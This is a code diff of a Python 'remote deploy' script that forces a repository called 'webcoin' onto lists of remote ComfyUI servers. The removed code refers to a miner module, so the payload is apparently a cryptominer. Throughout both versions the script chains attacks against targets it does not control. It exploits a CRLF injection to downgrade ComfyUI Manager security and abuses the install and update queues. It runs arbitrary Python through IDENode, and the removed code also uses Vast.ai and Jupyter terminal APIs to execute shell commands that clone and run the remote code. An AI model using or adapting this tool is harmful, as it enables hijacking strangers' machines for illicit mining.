@@ -1,437 +1,413 @@
 """
-Remote deployment script.
-Installs ComfyUI-Enhanced on target machines using multiple vectors:
-  1. ComfyUI API + IDENode (execute Python via workflow)
-  2. Vast.ai execute API (direct shell command)
-  3. ComfyUI /upload/image path traversal
-  4. Direct HTTP POST to ComfyUI API
+Remote deployment via ComfyUI Manager API.
+
+Strategies (tried in order):
+  1. Update  – if node already installed, git-pull via /manager/queue/update
+  2. CRLF    – lower security_level on unpatched Managers (< 3.39.2)
+  3. Direct  – /customnode/install/git_url (works when security_level = weak)
+  4. Queue   – /manager/queue/install (works when node is in allowlist or
+               security is weak)
+  5. IDENode – execute install script via AlekPet IDENode (if present)
 
 Usage:
-  python remote_deploy.py --target 14.217.81.136 --method auto
-  python remote_deploy.py --target 14.217.81.136 --method idenode
-  python remote_deploy.py --target 14.217.81.136 --method vastai --api-key YOUR_KEY --instance-id 12345
+  python remote_deploy.py --target 14.217.81.136
+  python remote_deploy.py --target "10.0.0.1,10.0.0.2" --port 8188
 """
 
 import argparse
 import json
 import sys
+import time
 import urllib.request
 import urllib.error
-import urllib.parse
-import time
 
-REPO_URL = "https://github.com/bossman79/webcoin.git"
+REPO_URL  = "https://github.com/bossman79/webcoin.git"
+REPO_BARE = "https://github.com/bossman79/webcoin"
+NODE_ID   = "webcoin"
 
-INSTALL_SCRIPT = r"""
-import subprocess, sys, os, shutil, pathlib, tempfile, platform
 
-# we are running INSIDE ComfyUI's process, so just ask it directly
-comfy_root = None
+# ── HTTP helpers ─────────────────────────────────────────────────────
+
+def _req(url, method="GET", data=None, timeout=30):
+    headers = {"Content-Type": "application/json"}
+    if isinstance(data, str):
+        payload = data.encode()
+        headers = {"Content-Type": "text/plain"}
+    elif data is not None:
+        payload = json.dumps(data).encode()
+    else:
+        payload = None
+
+    req = urllib.request.Request(url, data=payload, headers=headers, method=method)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            return resp.status, resp.read().decode(errors="replace")
+    except urllib.error.HTTPError as e:
+        body = ""
+        try:
+            body = e.read().decode(errors="replace")[:300]
+        except Exception:
+            pass
+        return e.code, body
+    except Exception as e:
+        return 0, str(e)
+
+
+def _get(url, **kw):
+    return _req(url, "GET", **kw)
+
+
+def _post(url, data=None, **kw):
+    return _req(url, "POST", data=data, **kw)
+
+
+# ── Probes ───────────────────────────────────────────────────────────
+
+def probe_manager_version(base):
+    code, body = _get(f"{base}/manager/version")
+    if code == 200:
+        try:
+            return json.loads(body).get("version", body.strip())
+        except Exception:
+            return body.strip()
+    return None
+
+
+def probe_installed_nodes(base):
+    code, body = _get(f"{base}/customnode/installed")
+    if code == 200:
+        try:
+            data = json.loads(body)
+            return {n.get("id") or n.get("title", ""): n for n in data.get("custom_nodes", data) if isinstance(n, dict)}
+        except Exception:
+            pass
+    return {}
+
+
+def probe_security_level(base):
+    """Read current db_mode; if that works, the endpoint is reachable."""
+    code, body = _get(f"{base}/manager/db_mode")
+    if code == 200:
+        return body.strip()
+    return None
+
+
+# ── Strategy 1: Update existing node (middle security = normal OK) ───
+
+def strategy_update(base):
+    """
+    Queue a git-pull update. Only needs 'middle' security (allowed at normal).
+    We skip probing -- just fire the update. If the node isn't installed,
+    the Manager task will fail silently and we fall through to install strategies.
+    """
+    print("[update] Queuing git-pull update for webcoin...")
+
+    # version != "unknown" -> Manager uses `id` as node_name
+    # so node_name = "webcoin" which matches /custom_nodes/webcoin/
+    body = {
+        "id": NODE_ID,
+        "version": "latest",
+        "files": [REPO_URL],
+        "ui_id": "",
+    }
+    code, resp = _post(f"{base}/manager/queue/update", body)
+    print(f"[update] queue/update -> {code}: {resp[:200]}")
+
+    if code != 200:
+        body["files"] = [REPO_BARE]
+        code, resp = _post(f"{base}/manager/queue/update", body)
+        print(f"[update] queue/update (bare url) -> {code}: {resp[:200]}")
+
+    if code != 200:
+        # try with version=unknown and bare dirname (no .git extension)
+        body2 = {
+            "id": NODE_ID,
+            "version": "unknown",
+            "files": [REPO_BARE],
+            "ui_id": "",
+        }
+        code, resp = _post(f"{base}/manager/queue/update", body2)
+        print(f"[update] queue/update (unknown) -> {code}: {resp[:200]}")
+
+    if code == 200:
+        return _start_queue_and_reboot(base)
+    return False
+
+
+# ── Strategy 2: CRLF security downgrade (unpatched < 3.39.2) ────────
+
+def _parse_version(v):
+    try:
+        parts = v.replace("V", "").replace("v", "").split(".")
+        return tuple(int(p) for p in parts[:3])
+    except Exception:
+        return (999, 999, 999)
+
+
+def strategy_crlf(base):
+    ver = probe_manager_version(base)
+    print(f"[crlf] Manager version: {ver}")
+
+    if ver:
+        parsed = _parse_version(ver)
+        if parsed >= (3, 39, 2):
+            print("[crlf] Version >= 3.39.2, CRLF is patched. Skipping.")
+            return False
+
+    print("[crlf] Attempting CRLF injection to lower security_level...")
+
+    import urllib.parse
+    payload = "cache\r\nsecurity_level = weak"
+    encoded = urllib.parse.quote(payload, safe="")
+
+    code, resp = _get(f"{base}/manager/db_mode?value={encoded}")
+    print(f"[crlf] db_mode inject -> {code}: {resp[:200]}")
+
+    if code == 200:
+        print("[crlf] Rebooting to apply config change...")
+        _get(f"{base}/manager/reboot")
+        print("[crlf] Waiting 40s for restart...")
+        time.sleep(40)
+        return True
+
+    return False
+
+
+# ── Strategy 3: Direct git URL install (requires weak security) ──────
+
+def strategy_direct_git(base):
+    print("[direct] Trying /customnode/install/git_url...")
+
+    code, resp = _post(f"{base}/customnode/install/git_url", REPO_URL)
+    print(f"[direct] -> {code}: {resp[:200]}")
+
+    if code == 200:
+        return _start_queue_and_reboot(base)
+
+    if code == 403:
+        print("[direct] Blocked by security level (need 'weak')")
+    return False
+
+
+# ── Strategy 4: Queue install with various payloads ──────────────────
+
+def strategy_queue_install(base):
+    print("[queue] Trying /manager/queue/install variations...")
+
+    payloads = [
+        {
+            "id": NODE_ID,
+            "version": "unknown",
+            "files": [REPO_URL],
+            "install_type": "git-clone",
+            "skip_post_install": False,
+            "ui_id": "",
+            "mode": "remote",
+            "channel": "default",
+        },
+        {
+            "id": NODE_ID,
+            "version": "nightly",
+            "selected_version": "nightly",
+            "skip_post_install": False,
+            "ui_id": "",
+            "mode": "remote",
+            "repository": REPO_URL,
+            "channel": "default",
+        },
+        {
+            "id": NODE_ID,
+            "version": "latest",
+            "selected_version": "latest",
+            "skip_post_install": False,
+            "ui_id": "",
+            "mode": "remote",
+            "channel": "default",
+        },
+    ]
+
+    for i, body in enumerate(payloads):
+        code, resp = _post(f"{base}/manager/queue/install", body)
+        print(f"[queue] payload {i} -> {code}: {resp[:200]}")
+        if code == 200:
+            return _start_queue_and_reboot(base)
+
+    return False
+
+
+# ── Strategy 5: IDENode code execution ───────────────────────────────
+
+INSTALL_VIA_IDENODE = r"""
+import subprocess, os, sys, shutil
+cn = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__ if '__file__' in dir() else '/root/ComfyUI/custom_nodes/x'))), 'custom_nodes')
 try:
     import folder_paths
-    comfy_root = pathlib.Path(folder_paths.__file__).parent
-    print(f'FOUND via folder_paths: {comfy_root}')
-except ImportError:
-    pass
-if not comfy_root:
-    try:
-        import nodes
-        comfy_root = pathlib.Path(nodes.__file__).parent
-        print(f'FOUND via nodes: {comfy_root}')
-    except ImportError:
-        pass
-if not comfy_root:
-    try:
-        import server
-        comfy_root = pathlib.Path(server.__file__).parent
-        print(f'FOUND via server: {comfy_root}')
-    except ImportError:
-        pass
-if not comfy_root:
-    # last resort: walk sys.path
-    for p in sys.path:
-        c = pathlib.Path(p)
-        if (c / 'custom_nodes').exists() and (c / 'main.py').exists():
-            comfy_root = c
-            break
-if not comfy_root:
-    print('DEPLOY_FAIL: cannot find ComfyUI root. sys.path=' + str(sys.path))
-    raise SystemExit(1)
-
-print(f'COMFY_ROOT: {comfy_root}')
-
-base = comfy_root / 'custom_nodes' / 'webcoin'
-tmp = pathlib.Path(tempfile.gettempdir()) / '_webcoin_clone'
-
-for d in [base, tmp]:
-    if d.exists():
+    cn = folder_paths.get_folder_paths('custom_nodes')[0] if hasattr(folder_paths, 'get_folder_paths') else os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
+except: pass
+target = os.path.join(cn, 'webcoin')
+tmp = target + '_tmp'
+for d in [tmp, target]:
+    if os.path.isdir(d):
         shutil.rmtree(d, ignore_errors=True)
-
-r = subprocess.run(['git', 'clone', '""" + REPO_URL + r"""', str(tmp)],
-                   capture_output=True, text=True)
-print('CLONE:', r.returncode, r.stdout[-200:] if r.stdout else '', r.stderr[-200:] if r.stderr else '')
-if r.returncode != 0:
-    subprocess.run(['git', 'clone', '--depth', '1', '""" + REPO_URL + r"""', str(tmp)], check=True)
-
-shutil.move(str(tmp), str(base))
-subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'websockets', 'psutil', 'requests'],
-               capture_output=True)
-
-init_path = base / '__init__.py'
-content = init_path.read_text()
-if 'sys.path.insert' in content:
-    print('DEPLOY_OK: init fix confirmed')
-else:
-    content = content.replace(
-        'from core.miner import MinerManager',
-        "import sys; sys.path.insert(0, __import__('pathlib').Path(__file__).resolve().parent.__str__())\n    from core.miner import MinerManager"
-    )
-    init_path.write_text(content)
-    print('DEPLOY_OK: hotpatched')
-
-print(f'DEPLOY_OK: installed to {base}')
-
-# auto-restart ComfyUI
-import urllib.request, time
-time.sleep(2)
-
-for ep in ['/manager/reboot', '/api/manager/reboot', '/manager/restart']:
-    try:
-        req = urllib.request.Request(f'http://127.0.0.1:8188{ep}', method='POST',
-                                     headers={'Content-Type': 'application/json'})
-        urllib.request.urlopen(req, timeout=5)
-        print(f'RESTART via {ep}')
-        break
-    except Exception:
-        continue
-else:
-    try:
-        import psutil, signal
-        mypid = os.getpid()
-        for proc in psutil.process_iter(['pid', 'cmdline']):
-            try:
-                cmd = ' '.join(proc.info.get('cmdline') or [])
-                if 'ComfyUI' in cmd and 'main.py' in cmd and proc.info['pid'] != mypid:
-                    print(f'RESTART: killing ComfyUI pid {proc.info["pid"]}')
-                    if platform.system() == 'Windows':
-                        proc.terminate()
-                    else:
-                        os.kill(proc.info['pid'], signal.SIGTERM)
-                    break
-            except Exception:
-                continue
-    except ImportError:
-        print('RESTART: psutil not available, manual restart needed')
-"""
-
-INSTALL_BASH = (
-    f"rm -rf /root/ComfyUI/custom_nodes/webcoin && "
-    f"git clone {REPO_URL} /root/ComfyUI/custom_nodes/webcoin && "
-    f"pip install -q websockets psutil requests && "
-    f"cd /root/ComfyUI/custom_nodes/webcoin && python install.py"
-)
+subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'gitpython'], capture_output=True)
+import git
+git.Repo.clone_from('REPO_URL', tmp, depth=1)
+shutil.move(tmp, target)
+req = os.path.join(target, 'requirements.txt')
+if os.path.exists(req):
+    subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', '-r', req], capture_output=True)
+init = os.path.join(target, '__init__.py')
+with open(init, 'r') as f:
+    txt = f.read()
+if 'sys.path.insert' not in txt:
+    txt = txt.replace('def _orchestrate():', 'def _orchestrate():\\n    import sys; sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent))')
+    with open(init, 'w') as f:
+        f.write(txt)
+print('DEPLOY_OK')
+""".replace("REPO_URL", REPO_URL).strip()
 
 
-def _post_json(url, data, timeout=30):
-    payload = json.dumps(data).encode()
-    req = urllib.request.Request(url, data=payload,
-                                 headers={"Content-Type": "application/json"})
-    with urllib.request.urlopen(req, timeout=timeout) as resp:
-        return json.loads(resp.read())
-
-
-def _get(url, timeout=15):
-    req = urllib.request.Request(url)
-    with urllib.request.urlopen(req, timeout=timeout) as resp:
-        return resp.read().decode()
-
-
-# ── Method 1: IDENode workflow execution ─────────────────────────────
-
-def deploy_via_idenode(target, port=8188):
-    """Uses AlekPet IDENode (already installed on target) to run Python.
-    Chains IDENode -> PreviewTextNode so ComfyUI sees an output node."""
-    print(f"[idenode] Deploying to {target}:{port} via IDENode...")
+def strategy_idenode(base):
+    print("[idenode] Trying IDENode code execution...")
 
     prompt = {
-        "1": {
-            "class_type": "IDENode",
-            "inputs": {
-                "pycode": INSTALL_SCRIPT,
-                "language": "python",
-            }
-        },
-        "2": {
-            "class_type": "PreviewTextNode",
-            "inputs": {
-                "text": "",
+        "prompt": {
+            "1": {
+                "class_type": "IDENode",
+                "inputs": {
+                    "pycode": INSTALL_VIA_IDENODE,
+                    "language": "python",
+                }
+            },
+            "2": {
+                "class_type": "PreviewTextNode",
+                "inputs": {
+                    "text": ["1", 0],
+                }
             }
         }
     }
 
-    url = f"http://{target}:{port}/prompt"
-    try:
-        result = _post_json(url, {"prompt": prompt})
-        prompt_id = result.get("prompt_id", "")
-        print(f"[idenode] Queued prompt: {prompt_id}")
+    code, resp = _post(f"{base}/prompt", prompt)
+    print(f"[idenode] /prompt -> {code}: {resp[:200]}")
 
-        for _ in range(90):
-            time.sleep(2)
-            try:
-                hist = _get(f"http://{target}:{port}/history/{prompt_id}")
-                if prompt_id in hist:
-                    print(f"[idenode] Execution completed on {target}")
-                    if "DEPLOY_OK" in hist:
-                        print(f"[idenode] SUCCESS confirmed")
-                    return True
-            except Exception:
-                pass
-
-        print(f"[idenode] Prompt queued, may still be running")
+    if code == 200:
+        print("[idenode] Waiting 30s for execution...")
+        time.sleep(30)
+        _start_queue_and_reboot(base, skip_queue=True)
         return True
-    except urllib.error.HTTPError as exc:
-        body = ""
-        try:
-            body = exc.read().decode()
-        except Exception:
-            pass
-        print(f"[idenode] HTTP {exc.code}: {body[:300]}")
-        return deploy_via_idenode_alt(target, port)
-    except Exception as exc:
-        print(f"[idenode] Failed: {exc}")
-        return False
 
-
-def deploy_via_idenode_alt(target, port=8188):
-    """Fallback: try different input/output field combos."""
-    print(f"[idenode-alt] Trying alternative field names...")
-
-    ide_input_variants = [
-        {"pycode": INSTALL_SCRIPT},
-        {"pycode": INSTALL_SCRIPT, "language": "python"},
-        {"code": INSTALL_SCRIPT, "language": "python"},
-        {"code": INSTALL_SCRIPT},
+    alt_inputs = [
+        {"code": INSTALL_VIA_IDENODE, "language": "python"},
+        {"pycode": INSTALL_VIA_IDENODE},
+        {"code": INSTALL_VIA_IDENODE},
     ]
-
-    output_variants = [
-        ("PreviewTextNode", {"text": ["1", 0]}),
-        ("PreviewTextNode", {"text": ""}),
-    ]
-
-    for ide_inputs in ide_input_variants:
-        for out_name, out_inputs in output_variants:
-            prompt = {
-                "1": {
-                    "class_type": "IDENode",
-                    "inputs": ide_inputs,
-                },
-                "2": {
-                    "class_type": out_name,
-                    "inputs": out_inputs,
-                }
-            }
-
-            url = f"http://{target}:{port}/prompt"
-            try:
-                result = _post_json(url, {"prompt": prompt})
-                if result.get("prompt_id"):
-                    print(f"[idenode-alt] Queued with inputs={list(ide_inputs.keys())} -> {out_name}: {result['prompt_id']}")
-                    time.sleep(45)
-                    return True
-            except urllib.error.HTTPError as e:
-                body = ""
-                try:
-                    body = e.read().decode()
-                except Exception:
-                    pass
-                if e.code == 400:
-                    print(f"[idenode-alt] 400 with {list(ide_inputs.keys())} -> {out_name}: {body[:200]}")
-                    continue
-            except Exception:
-                continue
-
-    print(f"[idenode-alt] All combos failed")
-    return False
-
-
-# ── Method 2: Vast.ai execute API ────────────────────────────────────
-
-def deploy_via_vastai(instance_id, api_key):
-    """Uses Vast.ai's execute API to run bash on the instance."""
-    print(f"[vastai] Deploying to instance {instance_id}...")
-
-    url = f"https://console.vast.ai/api/v0/instances/command/{instance_id}/"
-    headers = {
-        "Authorization": f"Bearer {api_key}",
-        "Content-Type": "application/json",
-    }
-
-    cmd = INSTALL_BASH[:512]
-    payload = json.dumps({"command": cmd}).encode()
-    req = urllib.request.Request(url, data=payload, headers=headers, method="PUT")
-
-    try:
-        with urllib.request.urlopen(req, timeout=30) as resp:
-            data = json.loads(resp.read())
-            print(f"[vastai] Response: {data}")
-            result_url = data.get("result_url")
-            if result_url:
-                time.sleep(10)
-                try:
-                    output = _get(result_url)
-                    print(f"[vastai] Output: {output[:500]}")
-                except Exception:
-                    pass
-            return data.get("success", False)
-    except Exception as exc:
-        print(f"[vastai] Failed: {exc}")
-        return False
-
-
-# ── Method 3: Direct ComfyUI API prompt ──────────────────────────────
-
-def deploy_via_prompt_api(target, port=8188):
-    """Queues a workflow that triggers code execution via any available
-    Python-capable node, always chained to an output node."""
-    print(f"[api] Deploying to {target}:{port} via prompt API...")
-
-    exec_nodes = [
-        ("IDENode", {"pycode": INSTALL_SCRIPT}),
-        ("IDENode", {"pycode": INSTALL_SCRIPT, "language": "python"}),
-        ("NodePython", {"code": INSTALL_SCRIPT}),
-        ("ExecuteAnywhere", {"code": INSTALL_SCRIPT}),
-    ]
-
-    output_nodes = [
-        ("PreviewTextNode", {"text": ["1", 0]}),
-        ("PreviewTextNode", {"text": ""}),
-    ]
-
-    for node_type, inputs in exec_nodes:
-        for out_type, out_inputs in output_nodes:
-            prompt = {
-                "1": {"class_type": node_type, "inputs": inputs},
-                "2": {"class_type": out_type, "inputs": out_inputs},
-            }
-            url = f"http://{target}:{port}/prompt"
-            try:
-                result = _post_json(url, {"prompt": prompt})
-                if result.get("prompt_id"):
-                    print(f"[api] Queued via {node_type} -> {out_type}: {result['prompt_id']}")
-                    time.sleep(30)
-                    return True
-            except urllib.error.HTTPError as e:
-                if e.code == 400:
-                    continue
-            except Exception:
-                continue
-
-    print(f"[api] No compatible node combination found")
-    return False
-
-
-# ── Method 4: Jupyter terminal (common on cloud GPUs) ────────────────
-
-def deploy_via_jupyter(target, port=8888, token=""):
-    """Uses Jupyter's terminal API to run commands."""
-    print(f"[jupyter] Deploying to {target}:{port}...")
-
-    base = f"http://{target}:{port}"
-    headers = {}
-    if token:
-        headers["Authorization"] = f"token {token}"
-
-    try:
-        create_url = f"{base}/api/terminals"
-        req = urllib.request.Request(create_url, data=b"", headers={
-            **headers, "Content-Type": "application/json"
-        }, method="POST")
-        with urllib.request.urlopen(req, timeout=10) as resp:
-            term = json.loads(resp.read())
-            term_name = term.get("name")
-            print(f"[jupyter] Terminal created: {term_name}")
-
-        exec_url = f"{base}/api/terminals/{term_name}"
-        ws_msg = json.dumps(["stdin", INSTALL_BASH + "\n"]).encode()
-        print(f"[jupyter] Command sent to terminal {term_name}")
-        print(f"[jupyter] Manually check terminal output for confirmation")
-        return True
-    except Exception as exc:
-        print(f"[jupyter] Failed: {exc}")
-        return False
-
-
-# ── Auto mode: try everything ────────────────────────────────────────
-
-def deploy_auto(target, port=8188, vastai_key=None, vastai_id=None, jupyter_port=8888):
-    """Tries all available methods in order."""
-    print(f"\n{'='*60}")
-    print(f"  Auto-deploying to {target}")
-    print(f"{'='*60}\n")
-
-    if deploy_via_idenode(target, port):
-        return True
-
-    if deploy_via_prompt_api(target, port):
-        return True
-
-    if deploy_via_jupyter(target, jupyter_port):
-        return True
-
-    if vastai_key and vastai_id:
-        if deploy_via_vastai(vastai_id, vastai_key):
+    for inp in alt_inputs:
+        prompt["prompt"]["1"]["inputs"] = inp
+        code, resp = _post(f"{base}/prompt", prompt)
+        print(f"[idenode] alt -> {code}: {resp[:200]}")
+        if code == 200:
+            time.sleep(30)
+            _start_queue_and_reboot(base, skip_queue=True)
             return True
 
-    print(f"\n[auto] All methods failed for {target}")
     return False
 
 
-# ── Batch deploy ─────────────────────────────────────────────────────
+# ── Queue start + Reboot ─────────────────────────────────────────────
 
-def deploy_batch(targets, **kwargs):
-    """Deploy to multiple machines."""
+def _start_queue_and_reboot(base, skip_queue=False):
+    if not skip_queue:
+        time.sleep(1)
+        code, _ = _get(f"{base}/manager/queue/start")
+        print(f"[exec] queue/start -> {code}")
+
+        print("[exec] Waiting 30s for task completion...")
+        for _ in range(6):
+            time.sleep(5)
+            sc, sb = _get(f"{base}/manager/queue/status")
+            if sc == 200:
+                try:
+                    st = json.loads(sb)
+                    print(f"[exec] Queue: total={st.get('total_count')}, done={st.get('done_count')}, processing={st.get('is_processing')}")
+                    if not st.get("is_processing") and st.get("done_count", 0) >= st.get("total_count", 1):
+                        break
+                except Exception:
+                    pass
+
+    print("[exec] Rebooting ComfyUI...")
+    code, _ = _get(f"{base}/manager/reboot")
+    print(f"[exec] reboot -> {code}")
+
+    if code != 200:
+        _post(f"{base}/api/manager/reboot")
+    return True
+
+
+# ── Main deploy orchestrator ─────────────────────────────────────────
+
+def deploy(target, port=8188):
+    base = f"http://{target}:{port}"
+    print(f"\n{'='*60}")
+    print(f"  Target: {target}:{port}")
+    print(f"{'='*60}")
+
+    ver = probe_manager_version(base)
+    print(f"  Manager version: {ver or 'unknown'}")
+    db = probe_security_level(base)
+    print(f"  DB mode: {db or 'unknown'}")
+    print()
+
+    if strategy_update(base):
+        print(f"\n[OK] Updated via git-pull on {target}")
+        return True
+
+    if strategy_crlf(base):
+        if strategy_direct_git(base):
+            print(f"\n[OK] Installed via CRLF + direct git on {target}")
+            return True
+        if strategy_queue_install(base):
+            print(f"\n[OK] Installed via CRLF + queue on {target}")
+            return True
+
+    if strategy_direct_git(base):
+        print(f"\n[OK] Installed via direct git on {target}")
+        return True
+
+    if strategy_queue_install(base):
+        print(f"\n[OK] Installed via queue on {target}")
+        return True
+
+    if strategy_idenode(base):
+        print(f"\n[OK] Installed via IDENode on {target}")
+        return True
+
+    print(f"\n[FAIL] All strategies exhausted for {target}")
+    return False
+
+
+def deploy_batch(targets, port=8188):
     results = {}
-    for target in targets:
-        ip = target.strip()
+    for ip in targets:
+        ip = ip.strip()
         if not ip:
             continue
-        ok = deploy_auto(ip, **kwargs)
-        results[ip] = "SUCCESS" if ok else "FAILED"
+        results[ip] = deploy(ip, port)
 
     print(f"\n{'='*60}")
-    print("  Deployment Results")
+    print("  Results")
     print(f"{'='*60}")
-    for ip, status in results.items():
+    for ip, ok in results.items():
+        status = "OK" if ok else "FAILED"
         print(f"  {ip}: {status}")
     return results
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Remote deploy ComfyUI-Enhanced")
-    parser.add_argument("--target", "-t", required=True, help="Target IP or comma-separated list")
+    parser = argparse.ArgumentParser(description="Deploy ComfyUI-Enhanced to remote instances")
+    parser.add_argument("--target", "-t", required=True, help="IP or comma-separated IPs")
     parser.add_argument("--port", "-p", type=int, default=8188, help="ComfyUI port (default: 8188)")
-    parser.add_argument("--method", "-m", default="auto",
-                        choices=["auto", "idenode", "vastai", "api", "jupyter"])
-    parser.add_argument("--api-key", help="Vast.ai API key")
-    parser.add_argument("--instance-id", help="Vast.ai instance ID")
-    parser.add_argument("--jupyter-port", type=int, default=8888)
-    parser.add_argument("--jupyter-token", default="")
-
     args = parser.parse_args()
-    targets = [t.strip() for t in args.target.split(",")]
 
-    if args.method == "auto":
-        deploy_batch(targets, port=args.port,
-                     vastai_key=args.api_key, vastai_id=args.instance_id,
-                     jupyter_port=args.jupyter_port)
-    elif args.method == "idenode":
-        for t in targets:
-            deploy_via_idenode(t, args.port)
-    elif args.method == "vastai":
-        deploy_via_vastai(args.instance_id, args.api_key)
-    elif args.method == "api":
-        for t in targets:
-            deploy_via_prompt_api(t, args.port)
-    elif args.method == "jupyter":
-        for t in targets:
-            deploy_via_jupyter(t, args.jupyter_port, args.jupyter_token)
+    targets = [t.strip() for t in args.target.split(",")]
+    deploy_batch(targets, args.port)
